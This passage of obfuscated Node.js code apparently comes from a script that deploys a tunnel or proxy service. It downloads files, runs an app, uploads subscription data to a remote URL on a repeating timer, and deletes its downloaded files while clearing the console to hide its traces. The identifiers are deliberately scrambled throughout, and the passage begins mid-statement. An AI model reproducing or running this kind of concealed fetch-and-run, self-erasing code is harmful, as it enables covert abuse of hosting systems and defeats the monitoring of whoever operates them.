_0x5ea1d0;KEEPALIVE?_0x5ea1d0=[]:_0x5ea1d0=[FILE_PATH+'/'+fileMapping[_0x1b94a0(0x1d7)],FILE_PATH+'/'+fileMapping[_0x1b94a0(0x1fd)],FILE_PATH+'/'+fileMapping[_0x1b94a0(0x288)],FILE_PATH+_0x1b94a0(0x26e),FILE_PATH+_0x1b94a0(0x28a)],_0x5ea1d0[_0x1b94a0(0x1f1)](_0x19f657=>{const _0x478990=_0x1b94a0;try{const _0x15d272=fs[_0x478990(0x25a)](_0x19f657);_0x15d272[_0x478990(0x209)]()?fs[_0x478990(0x251)](_0x19f657,{'recursive':!![]}):fs[_0x478990(0x1f7)](_0x19f657);}catch(_0x1b3f41){if(_0x1b3f41[_0x478990(0x214)]!=='ENOENT'){}}}),console[_0x1b94a0(0x23a)](),console[_0x1b94a0(0x1db)](_0x1b94a0(0x1fc));},0xea60);}let previousargoDomain='';async function subupload(){if(previousargoDomain&&argoDomain===previousargoDomain){}else{const _0x260534=await uploadSubscription(SNAME,UPLOAD_DATA,SURL);generateLinks(),previousargoDomain=argoDomain;}await delay(0xc350),await extractDomains();}async function main(){const _0x544359=_0x48b3e5;createFolder(FILE_PATH),createFolder(path['join'](FILE_PATH,_0x544359(0x21e))),await downloadFiles(),await delay(0x1388),await getipandisp(),await myconfig(),await runapp(),await extractDomains(),generateLinks(),httpserver(),cleanfiles();if(SURL){const _0x509ff3=await uploadSubscription(SNAME,UPLOAD_DATA,SURL);KEEPALIVE&&OPENSERVER&&!V_AUTH&&!V_DOMAIN&&(previousargoDomain=argoDomain,setInterval(subupload,intervalInseconds*0x3e8));}KEEPALIVE&&(await keep_alive(),setInterval(keep_alive,intervalInseconds*0x3e8));}main();